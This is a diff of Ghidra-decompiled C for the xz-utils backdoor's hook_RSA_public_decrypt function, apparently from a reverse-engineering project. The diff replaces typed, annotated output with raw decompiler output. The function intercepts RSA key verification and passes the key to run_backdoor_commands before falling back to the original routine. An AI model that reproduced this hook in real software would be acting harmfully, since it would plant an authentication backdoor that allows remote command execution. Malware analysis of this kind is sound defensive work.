@@ -1,7 +1,7 @@
 // /home/kali/xzre-ghidra/xzregh/10A240_hook_RSA_public_decrypt.c
 // Function: hook_RSA_public_decrypt @ 0x10A240
-// Calling convention: __stdcall
-// Prototype: int __stdcall hook_RSA_public_decrypt(int flen, uchar * from, uchar * to, RSA * rsa, int padding)
+// Calling convention: unknown
+// Prototype: undefined hook_RSA_public_decrypt(void)
 
 
 /*
@@ -10,31 +10,30 @@
 #include "xzre_types.h"
 
 
-int hook_RSA_public_decrypt(int flen,uchar *from,uchar *to,RSA *rsa,int padding)
+undefined8
+hook_RSA_public_decrypt
+          (undefined4 param_1,undefined8 param_2,undefined8 param_3,long param_4,ulong param_5)
 
 {
-  pfn_RSA_public_decrypt_t UNRECOVERED_JUMPTABLE;
-  BOOL BVar1;
-  int iVar2;
-  pfn_RSA_public_decrypt_t RSA_public_decrypt;
-  BOOL call_orig;
+  code *UNRECOVERED_JUMPTABLE;
+  undefined8 uVar1;
   int result;
   
-  if (((global_ctx != (global_context_t *)0x0) &&
-      (global_ctx->imported_funcs != (imported_funcs_t *)0x0)) &&
-     (UNRECOVERED_JUMPTABLE = global_ctx->imported_funcs->RSA_public_decrypt,
-     UNRECOVERED_JUMPTABLE != (pfn_RSA_public_decrypt_t)0x0)) {
-    if (rsa != (RSA *)0x0) {
+  if (((global_ctx != 0) && (*(undefined8 **)(global_ctx + 8) != (undefined8 *)0x0)) &&
+     (UNRECOVERED_JUMPTABLE = (code *)**(undefined8 **)(global_ctx + 8),
+     UNRECOVERED_JUMPTABLE != (code *)0x0)) {
+    if (param_4 != 0) {
       result = 1;
-      BVar1 = run_backdoor_commands(rsa,global_ctx,(BOOL *)&result);
+      uVar1 = run_backdoor_commands(param_4,global_ctx,&result);
+      param_5 = param_5 & 0xffffffff;
       if (result == 0) {
-        return BVar1;
+        return uVar1;
       }
     }
                     /* WARNING: Could not recover jumptable at 0x0010a2bd. Too many branches */
                     /* WARNING: Treating indirect jump as call */
-    iVar2 = (*UNRECOVERED_JUMPTABLE)(flen,from,to,rsa,padding);
-    return iVar2;
+    uVar1 = (*UNRECOVERED_JUMPTABLE)(param_1,param_2,param_3,param_4,param_5);
+    return uVar1;
   }
   return 0;
 }
